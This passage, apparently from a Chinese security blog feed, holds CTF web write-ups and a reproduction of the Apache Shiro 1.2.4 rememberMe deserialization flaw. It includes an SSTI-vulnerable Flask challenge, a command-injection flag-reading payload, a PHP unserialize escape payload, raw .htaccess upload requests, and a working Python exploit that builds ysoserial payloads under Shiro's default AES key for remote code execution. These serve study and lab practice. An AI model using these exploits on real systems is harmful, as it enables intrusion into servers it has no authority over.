class="comment">#34;admin&amp;#34;] = User(&amp;#39;admin&amp;#39;, ranstr(32))</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, username, password)</span>:</span></span><br><span class="line">        self.username = username</span><br><span class="line">        self.password = password</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">black_list</span><span class="params">(string)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> string:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> BLACKLIST:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&amp;#39;/&amp;#39;, methods=[&amp;#39;GET&amp;#39;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> &amp;<span class="comment">#39;username&amp;#39; in session:</span></span><br><span class="line">        <span class="keyword">if</span> session[&amp;<span class="comment">#39;username&amp;#39;] == &amp;#39;admin&amp;#39;:</span></span><br><span class="line">            <span class="keyword">return</span> render_template_string(</span><br><span class="line">                &amp;<span class="comment">#34;admin login success and check the secret route /secret_route_you_do_not_know&amp;#34;)</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> render_template(&amp;<span class="comment">#39;hello.html&amp;#39;, name=session[&amp;#39;username&amp;#39;])</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template_string(&amp;<span class="comment">#34;a easy flask problem,first login as the admin&amp;#34;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&amp;#39;/login&amp;#39;, methods=[&amp;#39;GET&amp;#39;, &amp;#39;POST&amp;#39;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> request.method == &amp;<span class="comment">#39;POST&amp;#39;:</span></span><br><span class="line">        username = request.form[&amp;<span class="comment">#39;username&amp;#39;] if &amp;#39;username&amp;#39; in request.form else &amp;#34;&amp;#34;</span></span><br><span class="line">        password = request.form[&amp;<span class="comment">#39;password&amp;#39;] if &amp;#39;password&amp;#39; in request.form else &amp;#34;&amp;#34;</span></span><br><span class="line">        <span class="keyword">if</span> username == &amp;<span class="comment">#34;&amp;#34; or password == &amp;#34;&amp;#34;:</span></span><br><span class="line">            <span class="keyword">return</span> render_template_string(&amp;<span class="comment">#34;pass the username or password use get method&amp;#34;)</span></span><br><span class="line">        <span class="keyword">if</span> username <span class="keyword">in</span> user_dicts <span class="keyword">and</span> user_dicts[username].password == password:</span><br><span class="line">            session[&amp;<span class="comment">#39;username&amp;#39;] = username</span></span><br><span class="line">            <span class="keyword">if</span> username == &amp;<span class="comment">#39;admin&amp;#39;:</span></span><br><span class="line">                <span class="keyword">return</span> render_template_string(&amp;<span class="comment">#34;admin login success!&amp;#34;)</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> render_template_string(&amp;<span class="comment">#34;login success!!&amp;#34;)</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> render_template_string(&amp;<span class="comment">#34;login fail! check /register&amp;#34;)</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(&amp;<span class="comment">#39;login.html&amp;#39;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&amp;#39;/register&amp;#39;, methods=[&amp;#39;GET&amp;#39;, &amp;#39;POST&amp;#39;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> request.method == &amp;<span class="comment">#39;POST&amp;#39;:</span></span><br><span class="line">        username = request.form[&amp;<span class="comment">#39;username&amp;#39;] if &amp;#39;username&amp;#39; in request.form else &amp;#34;&amp;#34;</span></span><br><span class="line">        password = request.form[&amp;<span class="comment">#39;password&amp;#39;] if &amp;#39;password&amp;#39; in request.form else &amp;#34;&amp;#34;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> username == &amp;<span class="comment">#34;&amp;#34; or password == &amp;#34;&amp;#34;:</span></span><br><span class="line">            <span class="keyword">return</span> render_template_string(&amp;<span class="comment">#34;pass the username or password use get method&amp;#34;)</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> username <span class="keyword">not</span> <span class="keyword">in</span> user_dicts:</span><br><span class="line">            user_dicts[username] = User(username, password)</span><br><span class="line">            <span class="keyword">return</span> render_template_string(&amp;<span class="comment">#34;register success&amp;#34;)</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> render_template_string(&amp;<span class="comment">#34;the user already exists&amp;#34;)</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(&amp;<span class="comment">#39;register.html&amp;#39;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&amp;#39;/secret_route_you_do_not_know&amp;#39;, methods=[&amp;#39;GET&amp;#39;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">secret</span><span class="params">()</span>:</span></span><br><span class="line">    guess = request.args[&amp;<span class="comment">#39;guess&amp;#39;] if &amp;#39;guess&amp;#39; in request.args else &amp;#39;&amp;#39;</span></span><br><span class="line">    secret_num = rd.randint(<span class="number">0</span>, <span class="number">100000</span>)</span><br><span class="line">    <span class="keyword">if</span> guess == &amp;<span class="comment">#39;&amp;#39;:</span></span><br><span class="line">        <span class="keyword">return</span> render_template_string(&amp;<span class="comment">#34;you should &amp;#39;guess&amp;#39; the secret number&amp;#34;)</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        guess_num = int(guess)</span><br><span class="line">        <span class="keyword">if</span> guess_num == secret_num:</span><br><span class="line">            <span class="keyword">return</span> render_template_string(&amp;<span class="comment">#39;final step, check the source code&amp;#39;)</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> render_template_string(&amp;<span class="comment">#39;you are wrong&amp;#39;)</span></span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> black_list(guess):</span><br><span class="line">            <span class="keyword">return</span> render_template_string(guess + &amp;<span class="comment">#39; error!!&amp;#39;)</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> render_template_string(&amp;<span class="comment">#39;black list filter&amp;#39;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == &amp;<span class="comment">#39;__main__&amp;#39;:</span></span><br><span class="line">    init()</span><br><span class="line">    app.run(host=&amp;<span class="comment">#39;0.0.0.0&amp;#39;, port=80)</span></span><br></pre></td></tr></table></figure>

<h1 id="0x03-easyphp"><a href="#0x03-easyphp" class="headerlink" title="0x03 easyphp"></a>0x03 easyphp</h1><h1 id="0x04-babyeval"><a href="#0x04-babyeval" class="headerlink" title="0x04 babyeval"></a>0x04 babyeval</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?a&#x3D;echo%20&#96;cat%20flag.php|base64&#96;;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/11/08/2020-UNCTF-Web-wp/image-20201108153855307.png" alt="image-20201108153855307"></p>
<p><img src="/2020/11/08/2020-UNCTF-Web-wp/image-20201108153949816.png" alt="image-20201108153949816"></p>
<h1 id="0x05-easyunserialize"><a href="#0x05-easyunserialize" class="headerlink" title="0x05 easyunserialize"></a>0x05 easyunserialize</h1><p>ç®€å•çš„å­—ç¬¦ä¸²é€ƒé€¸å¯¼è‡´çš„ååºåˆ—åŒ–</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $uname;</span><br><span class="line">    <span class="keyword">public</span> $password;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($uname,$password)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;uname=$uname;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password=$password;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;password===<span class="string">'easy'</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">include</span>(<span class="string">'flag.php'</span>);</span><br><span class="line">                <span class="keyword">echo</span> $flag;    </span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">'wrong password'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($string)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> str_replace(<span class="string">'challenge'</span>,<span class="string">'easychallenge'</span>,$string);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="keyword">new</span> a(<span class="string">'challengechallengechallengechallengechallengechallengechallenge";s:8:"password";s:4:"easy";'</span>,<span class="number">1</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> filter(serialize(<span class="keyword">new</span> a(<span class="string">'challengechallengechallengechallengechallengechallengechallenge";s:8:"password";s:4:"easy";'</span>,<span class="number">1</span>)));</span><br></pre></td></tr></table></figure>

<p><img src="/2020/11/08/2020-UNCTF-Web-wp/image-20201108155650924.png" alt="image-20201108155650924"></p>
]]></content>
  </entry>
  <entry>
    <title>shiro-1.2.4ååºåˆ—åŒ–å¤ç°</title>
    <url>/2020/11/07/shiro-1.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<p>å¾ˆä¹…çš„æ´äº†ï¼Œçœ‹èµ·æ¥æ„Ÿè§‰å¾ˆç®€å•ï¼Œç”¨èµ·æ¥çš„æ—¶å€™å°±ä¸æ˜¯é‚£ä¹ˆç®€å•äº†ï¼Œè¿˜æ˜¯éœ€è¦å¥½å¥½è°ƒè¯•ä¸€ä¸‹çš„</p>
<a id="more"></a>

<h1 id="0x01-docker-ç¯å¢ƒ"><a href="#0x01-docker-ç¯å¢ƒ" class="headerlink" title="0x01 docker ç¯å¢ƒ"></a>0x01 docker ç¯å¢ƒ</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker pull medicean/vulapps:s_shiro_1</span><br><span class="line">docker run -d -p 80:8080 medicean/vulapps:s_shiro_1</span><br></pre></td></tr></table></figure>

<p><img src="/2020/11/07/shiro-1.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/image-20201107222926819.png" alt="image-20201107222926819"></p>
<p>expï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">JAR_FILE = <span class="string">'ysoserial.jar'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">poc</span><span class="params">(url, rce_command)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">'://'</span> <span class="keyword">not</span> <span class="keyword">in</span> url:</span><br><span class="line">        target = <span class="string">'https://%s'</span> % url <span class="keyword">if</span> <span class="string">':443'</span> <span class="keyword">in</span> url <span class="keyword">else</span> <span class="string">'http://%s'</span> % url</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        target = url</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        payload = generator(rce_command, JAR_FILE)  <span class="comment"># ç”Ÿæˆpayload</span></span><br><span class="line">        r = requests.get(target, cookies=&#123;<span class="string">'rememberMe'</span>: payload.decode()&#125;, timeout=<span class="number">10</span>)  <span class="comment"># å‘é€éªŒè¯è¯·æ±‚</span></span><br><span class="line">        print(r.text)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generator</span><span class="params">(command, fp)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(fp):</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">'jar file not found!'</span>)</span><br><span class="line">    popen = subprocess.Popen([<span class="string">'java'</span>, <span class="string">'-jar'</span>, fp, <span class="string">'CommonsCollections2'</span>, command],</span><br><span class="line">                             stdout=subprocess.PIPE)</span><br><span class="line">    BS = AES.block_size</span><br><span class="line">    pad = <span class="keyword">lambda</span> s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()</span><br><span class="line">    key = <span class="string">"kPH+bIxk5D2deZiIxcaaaA=="</span></span><br><span class="line">    mode = AES.MODE_CBC</span><br><span class="line">    iv = uuid.uuid4().bytes</span><br><span class="line">    encryptor = AES.new(base64.b64decode(key), mode, iv)</span><br><span class="line">    file_body = pad(popen.stdout.read())</span><br><span class="line">    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))</span><br><span class="line">    <span class="keyword">return</span> base64_ciphertext</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">	<span class="comment">#http://www.jackson-t.ca/runtime-exec-payloads.html</span></span><br><span class="line">    poc(<span class="string">'http://192.168.59.128:80'</span>, <span class="string">'touch /tmp/test'</span>)</span><br></pre></td></tr></table></figure>

<img src="/2020/11/07/shiro-1.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/image-20201108231526653.png" alt="image-20201108231526653" style="zoom:200%;">

<h1 id="0x02-è°ƒè¯•ç¯å¢ƒ"><a href="#0x02-è°ƒè¯•ç¯å¢ƒ" class="headerlink" title="0x02 è°ƒè¯•ç¯å¢ƒ"></a>0x02 è°ƒè¯•ç¯å¢ƒ</h1><blockquote>
<p>win10  jdk1.8.0_102/jdk1.8.0_261  tomcat9.0.37</p>
</blockquote>
<p>shiro ä¸‹è½½é“¾æ¥ <a href="https://codeload.github.com/apache/shiro/zip/shiro-root-1.2.4" target="_blank" rel="noopener">https://codeload.github.com/apache/shiro/zip/shiro-root-1.2.4</a></p>
<p>ä¸‹è½½å®Œåç”¨ideaæ‰“å¼€samples/webç›®å½•ï¼Œç„¶ååœ¨pom.xmlä¸­åŠ å…¥</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">      <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">maven.compiler.source</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">maven.compiler.source</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">maven.compiler.target</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">maven.compiler.target</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jstl<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">scope</span>&gt;</span>runtime<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.commons<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections4<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>ç„¶åmavenä¸‹è½½åŒ…ï¼Œä¹‹åç”¨tomcatéƒ¨ç½²webï¼Œ</p>
<p><img src="/2020/11/07/shiro-1.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/image-20201110075808033.png" alt="image-20201110075808033"></p>
<p><img src="/2020/11/07/shiro-1.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/image-20201110075835741.png" alt="image-20201110075835741"></p>
<p>ç„¶åè¿è¡Œå³å¯ã€‚</p>
<p><img src="/2020/11/07/shiro-1.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/image-20201109205358251.png" alt="image-20201109205358251"></p>
<p>æœ¬åœ°æµ‹è¯• jdk1.8.0_102æˆåŠŸå¼¹å‡ºè®¡ç®—å™¨</p>
<p>æœ¬åœ°æµ‹è¯•jdk1.8.0_261æˆåŠŸå¼¹å‡ºè®¡ç®—å™¨</p>
<h2 id="2-1-åˆ†æåŠ å¯†è¿‡ç¨‹"><a href="#2-1-åˆ†æåŠ å¯†è¿‡ç¨‹" class="headerlink" title="2.1 åˆ†æåŠ å¯†è¿‡ç¨‹"></a>2.1 åˆ†æåŠ å¯†è¿‡ç¨‹</h2><p>åœ¨AbstractRememberMeManager.classçš„onSuccessfulLogin()å‡½æ•°ä¸‹æ–­ç‚¹ï¼Œå¼€å¯è°ƒè¯•ï¼Œå‘åŒ…</p>
<p><img src="/2020/11/07/shiro-1.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/image-20201109212754918.png" alt="image-20201109212754918"></p>
<p>è·Ÿè¿›<code>rememberIdentity()</code></p>
<p><img src="/2020/11/07/shiro-1.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/image-20201109230309287.png" alt="image-20201109230309287"></p>
<p>ç„¶ååˆ°è¾¾<code>convertPrincipalsToBytes()</code>ï¼Œ</p>
<p><img src="/2020/11/07/shiro-1.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/image-20201109225957934.png" alt="image-20201109225957934"></p>
<p>å¯ä»¥çœ‹å‡ºæ˜¯å…ˆè¿›è¡Œåºåˆ—åŒ–ï¼Œ</p>
<p><img src="/2020/11/07/shiro-1.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/image-20201109230738143.png" alt="image-20201109230738143"></p>
<p>ç„¶åå†åŠ å¯†ï¼ŒåŠ å¯†é‡‡ç”¨AESçš„CBCæ¨¡å¼</p>
<p><img src="/2020/11/07/shiro-1.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/image-20201109225722244.png" alt="image-20201109225722244"></p>
<p>å¯¹åº”çš„AESçš„å¯†é’¥ä¸º<code>kPH+bIxk5D2deZiIxcaaaA==</code>çš„base64è§£å¯†å€¼ã€‚</p>
<p><img src="/2020/11/07/shiro-1.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/image-20201110081043680.png" alt="image-20201110081043680"></p>
<p>ä¹‹åäº§ç”Ÿåˆå§‹åŒ–çš„IVï¼Œè¿›è¡ŒåŠ å¯†ã€‚</p>
<p><img src="/2020/11/07/shiro-1.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/image-20201110081437570.png" alt="image-20201110081437570"></p>
<p><img src="/2020/11/07/shiro-1.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/image-20201110081702788.png" alt="image-20201110081702788"></p>
<h2 id="2-2-è§£å¯†è¿‡ç¨‹åˆ†æ"><a href="#2-2-è§£å¯†è¿‡ç¨‹åˆ†æ" class="headerlink" title="2.2 è§£å¯†è¿‡ç¨‹åˆ†æ"></a>2.2 è§£å¯†è¿‡ç¨‹åˆ†æ</h2><p>æ–­ç‚¹æ–­åœ¨<code>AbstractRememberMeManager.class</code>çš„<code>getRememberedPrincipals()</code>ã€‚</p>
<p><img src="/2020/11/07/shiro-1.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/image-20201110083556969.png" alt="image-20201110083556969"></p>
<p><code>getRememberedSerializedIdentity()</code>å‡½æ•°å°†RememberMeçš„cookieå€¼base64è§£ç ï¼Œ</p>
<p><img src="/2020/11/07/shiro-1.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/image-20201110083822727.png" alt="image-20201110083822727"></p>
<p>ç„¶åè·Ÿè¿›<code>convertBytesToPrincipals()</code>å‡½æ•°ï¼Œ</p>
<p><img src="/2020/11/07/shiro-1.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/image-20201110084048135.png" alt="image-20201110084048135"></p>
<p>ç„¶åè¿›è¡Œè§£å¯†</p>
<p><img src="/2020/11/07/shiro-1.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/image-20201110084206912.png" alt="image-20201110084206912"></p>
<p>å¯¹åº”çš„AESè§£å¯†çš„å¯†é’¥ä¸º<code>kPH+bIxk5D2deZiIxcaaaA==</code>çš„base64è§£å¯†å€¼ã€‚</p>
<p><img src="/2020/11/07/shiro-1.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/image-20201110091326886.png" alt="image-20201110091326886"></p>
<p><img src="/2020/11/07/shiro-1.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/image-20201110084247565.png" alt="image-20201110084247565"></p>
<p>è§£å¯†å®Œåè¿›è¡Œååºåˆ—åŒ–</p>
<p><img src="/2020/11/07/shiro-1.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/image-20201110084721992.png" alt="image-20201110084721992"></p>
<p>cookieè§£å¯†è„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode_rememberme</span><span class="params">(cookie)</span>:</span></span><br><span class="line">    key  =  <span class="string">"kPH+bIxk5D2deZiIxcaaaA=="</span></span><br><span class="line">    mode =  AES.MODE_CBC</span><br><span class="line">    cipher = base64.b64decode(cookie)</span><br><span class="line">    IV   = cipher[<span class="number">0</span>:<span class="number">16</span>]</span><br><span class="line">    encryptor = AES.new(base64.b64decode(key), mode, IV=IV)</span><br><span class="line">    remember_bin = encryptor.decrypt(cipher)</span><br><span class="line">    <span class="keyword">return</span> remember_bin</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    cookie=<span class="string">""""""</span></span><br><span class="line">    print(decode_rememberme(cookie))</span><br></pre></td></tr></table></figure>

<img src="/2020/11/07/shiro-1.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/image-20201110090831607.png" alt="image-20201110090831607" style="zoom:150%;">

<p>å‚è€ƒï¼š</p>
<p><a href="http://redteam.today/2019/09/20/shiro%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/" target="_blank" rel="noopener">shiro ååºåˆ—åŒ–å¤ç°</a>    </p>
<p><a href="https://sherlocz.github.io/2020/08/02/shiro-1-2-4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">shiro 1.2.4ååºåˆ—åŒ–æ¼æ´åˆ†æ</a></p>
]]></content>
  </entry>
  <entry>
    <title>2020è¥¿æ¹–è®ºå‰‘web-wp</title>
    <url>/2020/10/12/2020%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91web-wp/</url>
    <content><![CDATA[<p>23333333333333</p>
<a id="more"></a>

<h1 id="0x01-upload"><a href="#0x01-upload" class="headerlink" title="0x01 upload"></a>0x01 upload</h1><p>æ–¹æ³•ä¸€ï¼šlua</p>
<p>1.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;sandbox&#x2F;gkqh0jd0dmt742l6r5k85qnp20&#x2F;index.php HTTP&#x2F;1.1</span><br><span class="line">Host: newupload.xhlj.wetolink.com</span><br><span class="line">Content-Length: 209</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http:&#x2F;&#x2F;newupload.xhlj.wetolink.com</span><br><span class="line">Content-Type: multipart&#x2F;form-data; boundary&#x3D;----WebKitFormBoundaryY23uQf1rBX9q3Ctt</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;86.0.4240.75 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Referer: http:&#x2F;&#x2F;newupload.xhlj.wetolink.com&#x2F;sandbox&#x2F;gkqh0jd0dmt742l6r5k85qnp20&#x2F;</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br><span class="line">Cookie: PHPSESSID&#x3D;gkqh0jd0dmt742l6r5k85qnp20</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryY23uQf1rBX9q3Ctt</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;file&quot;; filename&#x3D;&quot;.htaccess&quot;</span><br><span class="line">Content-Type: image&#x2F;png</span><br><span class="line"></span><br><span class="line">AddHandler lua-script  .lua</span><br><span class="line">------WebKitFormBoundaryY23uQf1rBX9q3Ctt--</span><br></pre></td></tr></table></figure>

<p>2.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;sandbox&#x2F;gkqh0jd0dmt742l6r5k85qnp20&#x2F;index.php HTTP&#x2F;1.1</span><br><span class="line">Host: newupload.xhlj.wetolink.com</span><br><span class="line">Content-Length: 770</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http:&#x2F;&#x2F;newupload.xhlj.wetolink.com</span><br><span class="line">Content-Type: multipart&#x2F;form-data; boundary&#x3D;----WebKitFormBoundaryY23uQf1rBX9q3Ctt</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;86.0.4240.75 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Referer: 